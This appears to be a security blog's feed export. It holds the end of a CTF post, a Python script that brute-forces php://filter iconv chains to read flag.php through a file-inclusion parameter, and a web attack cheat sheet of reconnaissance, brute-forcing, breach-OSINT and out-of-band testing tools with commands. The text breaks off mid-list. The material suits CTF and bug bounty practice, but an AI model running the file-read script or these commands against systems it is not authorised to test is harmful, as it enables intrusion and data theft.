argparse.ArgumentParser(description=<span class="string">&#x27;Process some parameters.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加参数</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;http://61.147.171.105:62409/&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The base URL, e.g., http://61.147.171.105:62409/&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--char&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Parameter name, e.g., filename&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;The file you want to read, e.g., flag.php&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">url = args.url+<span class="string">&#x27;?&#x27;</span></span><br><span class="line">char = args.char</span><br><span class="line">you_want_to_read = args.file</span><br><span class="line"><span class="comment"># url=&#x27;http://61.147.171.105:62409/?&#x27;</span></span><br><span class="line"><span class="comment"># char=input(&#x27;filename:&#x27;)#传参名字  比如?filename=</span></span><br><span class="line"><span class="comment"># you_want_to_read=input(&#x27;flag.php:&#x27;)</span></span><br><span class="line"><span class="comment"># payload=f&#x27;&#123;url&#125;&#123;char&#125;=php://filter//convert.iconv.&#123;key1&#125;.&#123;key2&#125;&#x27;</span></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"><span class="comment"># combinations = list(itertools.combinations(charsets, 2))</span></span><br><span class="line">maxlen=<span class="number">1160</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(charsets)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(charsets)):</span><br><span class="line">        <span class="keyword">if</span> i==j:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        key1, key2 = charsets[i],charsets[j]</span><br><span class="line">        payload=<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;char&#125;</span>=php://filter//convert.iconv.<span class="subst">&#123;key1&#125;</span>.<span class="subst">&#123;key2&#125;</span>/resource=<span class="subst">&#123;you_want_to_read&#125;</span>&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">import</span> requests</span><br><span class="line">        re=requests.get(payload)</span><br><span class="line">        <span class="comment"># print(re.status_code)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(re.text)&gt;maxlen:</span><br><span class="line">            maxlen=<span class="built_in">len</span>(re.text)</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            <span class="built_in">print</span>(re.text)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>外围信息收集流程(全)</title>
      <link href="/posts/842889f5.html"/>
      <url>/posts/842889f5.html</url>
      
        <content type="html"><![CDATA[<h1>Web Attack Cheat Sheet</h1><h2 id="Table-of-Contents">Table of Contents</h2><ul><li><a href="#discovering">Discovering</a><ul><li><a href="#targets">Targets</a></li><li><a href="#ip-enumeration">IP Enumeration</a></li><li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li><li><a href="#wayback-machine">Wayback Machine</a></li><li><a href="#cache">Cache</a></li><li><a href="#crawling">Crawling</a></li><li><a href="#wordlist">Wordlist</a></li><li><a href="#directory-bruteforcing">Directory Bruteforcing</a></li><li><a href="#parameter-bruteforcing">Parameter Bruteforcing</a></li><li><a href="#dns-and-http-detection">DNS and HTTP detection</a></li><li><a href="#acquisitionsnamesaddressescontactsemailsetc">Acquisitions/Names/Addresses/Contacts/Emails/etc.</a></li><li><a href="#htmljavascript-comments">HTML/JavaScript Comments</a></li><li><a href="#google-dorks">Google Dorks</a></li><li><a href="#content-security-policy-csp">Content Security Policy (CSP)</a></li><li><a href="#tiny-urls-services">Tiny URLs Services</a></li><li><a href="#graphql">GraphQL</a></li><li><a href="#general">General</a></li></ul></li><li><a href="#enumerating">Enumerating</a><ul><li><a href="#fingerprint">Fingerprint</a></li><li><a href="#buckets">Buckets</a></li><li><a href="#cloud-enumeration">Cloud Enumeration</a></li><li><a href="#containerization">Containerization</a></li><li><a href="#visual-identification">Visual Identification</a></li></ul></li><li><a href="#scanning">Scanning</a><ul><li><a href="#static-application-security-testing">Static Application Security Testing</a></li><li><a href="#dependency-confusion">Dependency Confusion</a></li><li><a href="#send-emails">Send Emails</a></li><li><a href="#search-vulnerabilities">Search Vulnerabilities</a></li><li><a href="#web-scanning">Web Scanning</a></li><li><a href="#http-request-smuggling">HTTP Request Smuggling</a></li><li><a href="#subdomain-takeover">Subdomain Takeover</a></li><li><a href="#sqli-sql-injection">SQLi (SQL Injection)</a></li><li><a href="#xss">XSS</a></li><li><a href="#repositories-scanning">Repositories Scanning</a></li><li><a href="#secret-scanning">Secret Scanning</a></li><li><a href="#google-dorks-scanning">Google Dorks Scanning</a></li><li><a href="#cors-misconfigurations">CORS Misconfigurations</a></li></ul></li><li><a href="#monitoring">Monitoring</a><ul><li><a href="#cve">CVE</a></li></ul></li><li><a href="#attacking">Attacking</a><ul><li><a href="#brute-force">Brute Force</a></li><li><a href="#exfiltration">Exfiltration</a></li><li><a href="#general-1">General</a></li></ul></li><li><a href="#manual">Manual</a><ul><li><a href="#payloads">Payloads</a></li><li><a href="#bypass">Bypass</a></li><li><a href="#deserialization">Deserialization</a></li><li><a href="#ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery)</a></li><li><a href="#oauth">OAuth</a></li><li><a href="#dns-rebinding">DNS Rebinding</a></li><li><a href="#smtp-header-injection">SMTP Header Injection</a></li><li><a href="#web-shell">Web Shell</a></li><li><a href="#reverse-shell">Reverse Shell</a></li><li><a href="#sqli-sql-injection-1">SQLi (SQL Injection)</a></li><li><a href="#xss-1">XSS</a></li><li><a href="#xpath-injection">XPath Injection</a></li><li><a href="#lfi-local-file-inclusion">LFI (Local File Inclusion)</a></li><li><a href="#ssti-server-side-template-injection">SSTI (Server Side Template Injection)</a></li><li><a href="#information-disclosure">Information Disclosure</a></li><li><a href="#webdav-web-distributed-authoring-and-versioning">WebDAV (Web Distributed Authoring and Versioning)</a></li><li><a href="#generic-tools">Generic Tools</a></li></ul></li><li><a href="#general-2">General</a></li></ul><h2 id="Discovering">Discovering</h2><h3 id="Targets">Targets</h3><p><a href="https://github.com/arkadiyt/bounty-targets-data">https://github.com/arkadiyt/bounty-targets-data</a><br><br># This repo contains data dumps of Hackerone and Bugcrowd scopes (i.e. the domains that are eligible for bug bounty reports).</p><p><a href="https://chaos.projectdiscovery.io">https://chaos.projectdiscovery.io</a><br><br># We actively collect and maintain internet-wide assets’ data, this project is meant to enhance research and analyse changes around DNS for better insights.</p><p><a href="https://chaos-data.projectdiscovery.io/index.json">https://chaos-data.projectdiscovery.io/index.json</a><br><br># Project Discovery Chaos Data</p><h3 id="IP-Enumeration">IP Enumeration</h3><p><a href="http://www.asnlookup.com">http://www.asnlookup.com</a><br><br># This tool leverages ASN to look up IP addresses (IPv4 &amp; IPv6) owned by a specific organization for reconnaissance purposes.</p><p><a href="https://github.com/pielco11/fav-up">https://github.com/pielco11/fav-up</a><br><br># Lookups for real IP starting from the favicon icon and using Shodan.<br><br><code>python3 favUp.py --favicon-file favicon.ico -sc</code></p><p><a href="https://stackoverflow.com/questions/16986879/bash-script-to-list-all-ips-in-prefix">https://stackoverflow.com/questions/16986879/bash-script-to-list-all-ips-in-prefix</a><br><br># List all IP addresses in a given CIDR block<br><br><code>nmap -sL -n 10.10.64.0/27 | awk '/Nmap scan report/&#123;print $NF&#125;'</code></p><p><a href="https://kaeferjaeger.gay/?dir=cdn-ranges/">https://kaeferjaeger.gay/?dir=cdn-ranges/</a><br><br># Lists of IP ranges used by CDNs (Cloudflare, Akamai, Incapsula, Fastly, etc). Updated every 30 minutes.</p><p><a href="https://kaeferjaeger.gay/?dir=ip-ranges/">https://kaeferjaeger.gay/?dir=ip-ranges/</a><br><br># Lists of IP ranges from: Google (Cloud &amp; GoogleBot), Bing (Bingbot), Amazon (AWS), Microsoft (Azure), Oracle (Cloud) and DigitalOcean. Updated every 6 hours.</p><p><a href="https://netlas.io/">https://netlas.io/</a><br><br># Internet intelligence apps that provide accurate technical information on IP addresses, domain names, websites, web applications, IoT devices, and other online assets.</p><p><a href="https://github.com/zidansec/CloudPeler">https://github.com/zidansec/CloudPeler</a><br><br># This tools can help you to see the real IP behind CloudFlare protected websites.</p><h3 id="Subdomain-Enumeration">Subdomain Enumeration</h3><p><a href="https://web.archive.org/web/20211127183642/https://appsecco.com/books/subdomain-enumeration/">https://web.archive.org/web/20211127183642/https://appsecco.com/books/subdomain-enumeration/</a><br><br># This book intendes to be a reference for subdomain enumeration techniques.</p><p><a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a><br><br># ksubdomain是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。<br><br><code>ksubdomain -d example.com</code></p><p><a href="https://github.com/OWASP/Amass">https://github.com/OWASP/Amass</a><br><br># The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.<br><br><code>amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com</code></p><p><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a><br><br># subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.<br><br><code>subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com</code></p><p><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br><br># Altdns is a DNS recon tool that allows for the discovery of subdomains that conform to patterns. Altdns takes in words that could be present in subdomains under a domain (such as test, dev, staging) as well as takes in a list of subdomains that you know of.<br><br><code>altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt</code></p><p><a href="https://github.com/Josue87/gotator">https://github.com/Josue87/gotator</a><br><br># Gotator is a tool to generate DNS wordlists through permutations.<br><br><code>gotator -sub domains.txt -perm permutations.txt -depth 2 -numbers 5 &gt; output.txt</code></p><p><a href="https://github.com/nsonaniya2010/SubDomainizer">https://github.com/nsonaniya2010/SubDomainizer</a><br><br># SubDomainizer is a tool designed to find hidden subdomains and secrets present is either webpage, Github, and external javascripts present in the given URL.<br><br><code>python3 SubDomainizer.py -u example.com -o dir/example.com</code></p><p><a href="https://github.com/projectdiscovery/uncover">https://github.com/projectdiscovery/uncover</a><br><br># uncover is a go wrapper using APIs of well known search engines to quickly discover exposed hosts on the internet.</p><p><a href="https://dns.bufferover.run/dns?q=example.com">https://dns.bufferover.run/dns?q=example.com</a><br><br># Powered by DNSGrep (<a href="https://github.com/erbbysam/DNSGrep">https://github.com/erbbysam/DNSGrep</a>)<br><br># A utility for quickly searching presorted DNS names. Built around the Rapid7 rdns &amp; fdns dataset.</p><p><a href="https://crt.sh/?q=example.com">https://crt.sh/?q=example.com</a><br><br># Certificate Search</p><p><a href="https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization">https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization</a><br><br># Censys is the most reputable, exhaustive, and up-to-date source of Internet scan data in the world, so you see everything.</p><p><a href="https://www.shodan.io/search?query=ssl%3AExample">https://www.shodan.io/search?query=ssl%3AExample</a><br><br># Shodan is the world’s first search engine for Internet-connected devices.</p><p><a href="https://fullhunt.io/">https://fullhunt.io/</a><br><br># If you don’t know all your internet-facing assets, which ones are vulnerable, FullHunt is here for you.</p><p><a href="https://github.com/xiecat/fofax">https://github.com/xiecat/fofax</a><br><br># fofax is a fofa query tool written in go, positioned as a command-line tool and characterized by simplicity and speed.<br><br><code>fofax -q 'app=&quot;APACHE-Solr&quot;'</code></p><p><a href="https://publicwww.com">https://publicwww.com</a><br><br># Find any alphanumeric snippet, signature or keyword in the web pages HTML, JS and CSS code.</p><p><a href="https://fofa.so">https://fofa.so</a><br><br># FOFA (Cyberspace Assets Retrieval System) is the world’s IT equipment search engine with more complete data coverage, and it has more complete DNA information of global networked IT equipment.</p><p><a href="https://www.zoomeye.org">https://www.zoomeye.org</a><br><br># ZoomEyeis China’s first and world-renowned cyberspace search engine driven by 404 Laboratory of Knownsec. Through a large number of global surveying and mapping nodes, according to the global IPv4, IPv6 address and website domain name databases，it can continuously scan and identify multiple service port and protocols 24 hours a day, and finally map the whole or local cyberspace.</p><p><a href="https://securitytrails.com/list/email/dns-admin.example.com">https://securitytrails.com/list/email/dns-admin.example.com</a><br><br># Total Internet Inventory with the most comprehensive data that informs with unrivaled accuracy.<br><br><code>curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey=&#123;API_Key&#125;&amp;page=1&amp;scroll=true' --data '&#123;&quot;filter&quot;:&#123;&quot;apex_domain&quot;:&quot;example.com&quot;&#125;&#125;' | jq -Mr '.records[].hostname' &gt;&gt; subdomains.txt</code><br><br><code>curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey=&#123;API_Key&#125;&amp;page=1&amp;scroll=true' --data '&#123;&quot;filter&quot;:&#123;&quot;whois_email&quot;:&quot;domains@example.com&quot;&#125;&#125;' | jq -Mr '.records[].hostname' &gt;&gt; domains.txt</code></p><p><a href="https://viewdns.info/reversewhois">https://viewdns.info/reversewhois</a><br><br># This free tool will allow you to find domain names owned by an individual person or company.</p><p><a href="https://www.whoxy.com">https://www.whoxy.com</a><br><br># Our WHOIS API returns consistent and well-structured WHOIS data in XML &amp; JSON format. Returned data contain parsed WHOIS fields that can be easily understood by your application.</p><p><a href="https://github.com/MilindPurswani/whoxyrm">https://github.com/MilindPurswani/whoxyrm</a><br><br># A reverse whois tool based on Whoxy API based on @jhaddix’s talk on Bug Hunter’s Methodology v4.02.<br><br><code>whoxyrm -company-name &quot;Example Inc.&quot;</code></p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a><br><br># Offering researchers and community members open access to data from Project Sonar, which conducts internet-wide surveys to gain insights into global exposure to common vulnerabilities.</p><p><a href="https://openintel.nl/">https://openintel.nl/</a><br><br># The goal of the OpenINTEL measurement platform is to capture daily snapshots of the state of large parts of the global Domain Name System. Because the DNS plays a key role in almost all Internet services, recording this information allows us to track changes on the Internet, and thus its evolution, over longer periods of time. By performing active measurements, rather than passively collecting DNS data, we build consistent and reliable time series of the state of the DNS.</p><p><a href="https://github.com/ninoseki/mihari">https://github.com/ninoseki/mihari</a><br><br># Mihari is a framework for continuous OSINT based threat hunting.</p><p><a href="https://github.com/ProjectAnte/dnsgen">https://github.com/ProjectAnte/dnsgen</a><br><br># This tool generates a combination of domain names from the provided input. Combinations are created based on wordlist. Custom words are extracted per execution.</p><p><a href="https://github.com/resyncgg/ripgen">https://github.com/resyncgg/ripgen</a><br><br># A rust-based version of the popular dnsgen python utility.</p><p><a href="https://github.com/d3mondev/puredns">https://github.com/d3mondev/puredns</a><br><br># Fast domain resolver and subdomain bruteforcing with accurate wildcard filtering.</p><p><a href="https://github.com/projectdiscovery/dnsx">https://github.com/projectdiscovery/dnsx</a><br><br># Fast and multi-purpose DNS toolkit allow to run multiple DNS queries.</p><p><a href="https://github.com/glebarez/cero">https://github.com/glebarez/cero</a><br><br># Cero will connect to remote hosts, and read domain names from the certificates provided during TLS handshake.</p><p><a href="https://cramppet.github.io/regulator/index.html">https://cramppet.github.io/regulator/index.html</a><br><br># Regulator: A unique method of subdomain enumeration</p><p><a href="https://github.com/blechschmidt/massdns">https://github.com/blechschmidt/massdns</a><br><br># MassDNS is a simple high-performance DNS stub resolver targeting those who seek to resolve a massive amount of domain names in the order of millions or even billions.<br><br><code>massdns -r resolvers.txt -o S -w massdns.out subdomains.txt</code></p><p><a href="https://github.com/trickest/resolvers">https://github.com/trickest/resolvers</a><br><br># The most exhaustive list of reliable DNS resolvers.</p><p><a href="https://github.com/n0kovo/n0kovo_subdomains">https://github.com/n0kovo/n0kovo_subdomains</a><br><br># An extremely effective subdomain wordlist of 3,000,000 lines, crafted by harvesting SSL certs from the entire IPv4 space.</p><h3 id="Wayback-Machine">Wayback Machine</h3><p><a href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a><br><br># Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for *.domain and output them on stdout.<br><br><code>cat subdomains.txt | waybackurls &gt; waybackurls.txt</code></p><p><a href="https://github.com/tomnomnom/hacks">https://github.com/tomnomnom/hacks</a><br><br># Hacky one-off scripts, tests etc.<br><br><code>cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt</code></p><p><a href="https://github.com/lc/gau">https://github.com/lc/gau</a><br><br># getallurls (gau) fetches known URLs from AlienVault’s Open Threat Exchange, the Wayback Machine, and Common Crawl for any given domain.<br><br><code>cat domains.txt | gau --threads 5</code></p><h3 id="Cache">Cache</h3><p><a href="https://portswigger.net/research/practical-web-cache-poisoning">https://portswigger.net/research/practical-web-cache-poisoning</a><br><br># Web cache poisoning has long been an elusive vulnerability, a ‘theoretical’ threat used mostly to scare developers into obediently patching issues that nobody could actually exploit.<br><br># In this paper I’ll show you how to compromise websites by using esoteric web features to turn their caches into exploit delivery systems, targeting everyone that makes the mistake of visiting their homepage.</p><p><a href="https://www.giftofspeed.com/cache-checker">https://www.giftofspeed.com/cache-checker</a><br><br># This tool lists which web files on a website are cached and which are not. Furthermore it checks by which method these files are cached and what the expiry time of the cached files is.</p><p><a href="https://youst.in/posts/cache-poisoning-at-scale/">https://youst.in/posts/cache-poisoning-at-scale/</a><br><br># Even though Web Cache Poisoning has been around for years, the increasing complexity in technology stacks constantly introduces unexpected behaviour which can be abused to achieve novel cache poisoning attacks. In this paper I will present the techniques I used to report over 70 cache poisoning vulnerabilities to various Bug Bounty programs.</p><p><a href="https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner">https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner</a><br><br># Web Cache Vulnerability Scanner (WCVS) is a fast and versatile CLI scanner for web cache poisoning developed by Hackmanit.<br><br><code>wcvs -u https://example.com -hw &quot;file:/home/user/Documents/wordlist-header.txt&quot; -pw &quot;file:/home/user/Documents/wordlist-parameter.txt&quot;</code></p><h3 id="Crawling">Crawling</h3><p><a href="https://github.com/jaeles-project/gospider">https://github.com/jaeles-project/gospider</a><br><br># Fast web spider written in Go.<br><br><code>gospider -s &quot;https://example.com/&quot; -o output -c 20 -d 10</code></p><p><a href="https://github.com/xnl-h4ck3r/xnLinkFinder">https://github.com/xnl-h4ck3r/xnLinkFinder</a><br><br># This is a tool used to discover endpoints (and potential parameters) for a given target.</p><p><a href="https://github.com/hakluke/hakrawler">https://github.com/hakluke/hakrawler</a><br><br># Fast golang web crawler for gathering URLs and JavaScript file locations. This is basically a simple implementation of the awesome Gocolly library.<br><br><code>echo https://example.com | hakrawler</code></p><p><a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a><br><br># A next-generation crawling and spidering framework.<br><br><code>katana -u https://example.com</code></p><p><a href="https://geotargetly.com/geo-browse">https://geotargetly.com/geo-browse</a><br><br># Geo Browse is a tool designed to capture screenshots of your website from different countries.</p><p><a href="https://commoncrawl.org/">https://commoncrawl.org/</a><br><br># We build and maintain an open repository of web crawl data that can be accessed and analyzed by anyone.</p><p><a href="https://github.com/bitquark/shortscan">https://github.com/bitquark/shortscan</a><br><br># Shortscan is designed to quickly determine which files with short filenames exist on an IIS webserver. Once a short filename has been identified the tool will try to automatically identify the full filename.<br><br><code>shortscan https://example.com/</code></p><h3 id="Wordlist">Wordlist</h3><p><a href="https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7">https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7</a><br><br># Scrapes all unique words and numbers for use with password cracking.</p><p><a href="https://github.com/ameenmaali/wordlistgen">https://github.com/ameenmaali/wordlistgen</a><br><br># wordlistgen is a tool to pass a list of URLs and get back a list of relevant words for your wordlists.<br><br><code>cat hosts.txt | wordlistgen</code></p><p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a><br><br># SecLists is the security tester’s companion. It’s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a><br><br># A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques.</p><p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><br># FuzzDB was created to increase the likelihood of finding application security vulnerabilities through dynamic application security testing.</p><p><a href="https://github.com/google/fuzzing">https://github.com/google/fuzzing</a><br><br># This project aims at hosting tutorials, examples, discussions, research proposals, and other resources related to fuzzing.</p><p><a href="https://wordlists.assetnote.io">https://wordlists.assetnote.io</a><br><br># This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.</p><p><a href="https://github.com/trickest/wordlists">https://github.com/trickest/wordlists</a><br><br># Real-world infosec wordlists, updated regularly.</p><h3 id="Directory-Bruteforcing">Directory Bruteforcing</h3><p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a><br><br># A fast web fuzzer written in Go.<br><br><code>ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist.txt -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'</code></p><p><a href="https://github.com/iustin24/chameleon">https://github.com/iustin24/chameleon</a><br><br># Chameleon provides better content discovery by using wappalyzer’s set of technology fingerprints alongside custom wordlists tailored to each detected technologies.<br><br><code>chameleon --url https://example.com -a</code></p><p><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a><br><br># Gobuster is a tool used to brute-force.<br><br><code>gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'</code></p><p><a href="https://github.com/tomnomnom/meg">https://github.com/tomnomnom/meg</a><br><br># meg is a tool for fetching lots of URLs but still being ‘nice’ to servers.<br><br><code>meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic</code></p><p><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a><br><br># Cansina is a Web Content Discovery Application.<br><br><code>python3 cansina.py -u 'https://example.com/' -p mydirfilelist.txt --persist</code></p><p><a href="https://github.com/epi052/feroxbuster">https://github.com/epi052/feroxbuster</a><br><br># A simple, fast, recursive content discovery tool written in Rust.<br><br><code>feroxbuster -u 'https://example.com/' -x pdf -x js,html -x php txt json,docx</code></p><p><a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a><br><br># httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp library, it is designed to maintain the result reliability with increased threads.<br><br><code>cat hosts.txt | httpx</code></p><p><a href="https://github.com/assetnote/kiterunner">https://github.com/assetnote/kiterunner</a><br><br># Kiterunner is a tool that is capable of not only performing traditional content discovery at lightning fast speeds, but also bruteforcing routes/endpoints in modern applications.</p><h3 id="Parameter-Bruteforcing">Parameter Bruteforcing</h3><p><a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a><br><br># Arjun can find query parameters for URL endpoints.<br><br><code>arjun -u https://example.com/</code></p><p><a href="https://github.com/Sh1Yo/x8">https://github.com/Sh1Yo/x8</a><br><br># Hidden parameters discovery suite written in Rust.<br><br><code>x8 -u &quot;https://example.com/&quot; -w &lt;wordlist&gt;</code></p><h3 id="DNS-and-HTTP-detection">DNS and HTTP detection</h3><p><a href="https://ceye.io">https://ceye.io</a><br><br># Monitor service for security testing.<br><br><code>curl http://api.ceye.io/v1/records?token=&#123;API Key&#125;&amp;type=dns curl http://api.ceye.io/v1/records?token=&#123;API Key&#125;&amp;type=http</code></p><p><a href="https://portswigger.net/burp/documentation/collaborator">https://portswigger.net/burp/documentation/collaborator</a><br><br># Burp Collaborator is a network service that Burp Suite uses to help discover many kinds of vulnerabilities.<br><br># Tip <a href="https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions">https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions</a></p><p><a href="https://httpbin.org/">https://httpbin.org/</a><br><br># A simple HTTP Request &amp; Response Service.</p><p><a href="http://pingb.in">http://pingb.in</a><br><br># Simple DNS and HTTP service for security testing.</p><p><a href="https://github.com/ctxis/SnitchDNS">https://github.com/ctxis/SnitchDNS</a><br><br># SnitchDNS is a database driven DNS Server with a Web UI, written in Python and Twisted, that makes DNS administration easier with all configuration changed applied instantly without restarting any system services.</p><p><a href="http://dnslog.cn">http://dnslog.cn</a><br><br># Simple DNS server with realitme logs.</p><p><a href="https://interact.projectdiscovery.io/">https://interact.projectdiscovery.io/</a><br><br># Interactsh is an Open-Source Solution for Out of band Data Extraction, A tool designed to detect bugs that cause external interactions, For example - Blind SQLi, Blind CMDi, SSRF, etc.</p><p><a href="https://canarytokens.org/">https://canarytokens.org/</a><br><br># You’ll be familiar with web bugs, the transparent images which track when someone opens an email. They work by embedding a unique URL in a page’s image tag, and monitoring incoming GET requests.<br><br># Imagine doing that, but for file reads, database queries, process executions or patterns in log files. Canarytokens does all this and more, letting you implant traps in your production systems rather than setting up separate honeypots.</p><h3 id="Acquisitions-Names-Addresses-Contacts-Emails-etc">Acquisitions/Names/Addresses/Contacts/Emails/etc.</h3><p><a href="https://hunter.io">https://hunter.io</a><br><br># Hunter lets you find email addresses in seconds and connect with the people that matter for your business.</p><p><a href="https://intelx.io">https://intelx.io</a><br><br># Intelligence X is an independent European technology company founded in 2018 by Peter Kleissner. The company is based in Prague, Czech Republic. Its mission is to develop and maintain the search engine and data archive.</p><p><a href="https://www.nerdydata.com">https://www.nerdydata.com</a><br><br># Find companies based on their website’s tech stack or code.</p><p><a href="https://github.com/khast3x/h8mail">https://github.com/khast3x/h8mail</a><br><br># h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt’s “Collection1” and the infamous “Breach Compilation” torrent.<br><br><code>h8mail -t target@example.com</code></p><p><a href="https://dashboard.fullcontact.com">https://dashboard.fullcontact.com</a><br><br># Our person-first Identity Resolution Platform provides the crucial intelligence needed to drive Media Amplification, Omnichannel Measurement, and Customer Recognition.</p><p><a href="https://www.peopledatalabs.com">https://www.peopledatalabs.com</a><br><br># Our data empowers developers to build innovative, trusted data-driven products at scale.</p><p><a href="https://www.social-searcher.com">https://www.social-searcher.com</a><br><br># Free Social Media Search Engine.</p><p><a href="https://github.com/mxrch/GHunt">https://github.com/mxrch/GHunt</a><br><br># GHunt is an OSINT tool to extract information from any Google Account using an email.<br><br><code>python3 ghunt.py email myemail@gmail.com</code></p><h3 id="HTML-JavaScript-Comments">HTML/JavaScript Comments</h3><p><a href="https://portswigger.net/support/using-burp-suites-engagement-tools">https://portswigger.net/support/using-burp-suites-engagement-tools</a><br><br># Burp Engagement Tools</p><h3 id="Google-Dorks">Google Dorks</h3><p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a><br><br># Google Hacking Database</p><p><br># Search on AWS<br><br><code>site:amazonaws.com company</code></p><h3 id="Content-Security-Policy-CSP">Content Security Policy (CSP)</h3><p><a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a><br><br># CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.</p><h3 id="Tiny-URLs-Services">Tiny URLs Services</h3><p><a href="https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research">https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research</a><br><br># Cornell Tech Url Shortening Research</p><p><a href="https://github.com/utkusen/urlhunter">https://github.com/utkusen/urlhunter</a><br><br># urlhunter is a recon tool that allows searching on URLs that are exposed via shortener services such as <a href="http://bit.ly">bit.ly</a> and <a href="http://goo.gl">goo.gl</a>.<br><br><code>urlhunter -keywords keywords.txt -date 2020-11-20 -o out.txt</code></p><p><a href="https://shorteners.grayhatwarfare.com">https://shorteners.grayhatwarfare.com</a><br><br># Search Shortener Urls</p><h3 id="GraphQL">GraphQL</h3><p><a href="https://github.com/doyensec/graph-ql">https://github.com/doyensec/graph-ql</a><br><br># A security testing tool to facilitate GraphQL technology security auditing efforts.</p><p><a href="https://hackernoon.com/understanding-graphql-part-1-nxm3uv9">https://hackernoon.com/understanding-graphql-part-1-nxm3uv9</a><br><br># Understanding GraphQL</p><p><a href="https://graphql.org/learn/introspection/">https://graphql.org/learn/introspection/</a><br><br># It’s often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!</p><p><a href="https://github.com/nikitastupin/clairvoyance">https://github.com/nikitastupin/clairvoyance</a><br><br># Obtain GraphQL API schema even if the introspection is disabled.<br><br><code>clairvoyance https://www.example.com/graphql -o schema.json</code></p><p><a href="https://jondow.eu/practical-graphql-attack-vectors/">https://jondow.eu/practical-graphql-attack-vectors/</a><br><br># Practical GraphQL attack vectors</p><p><a 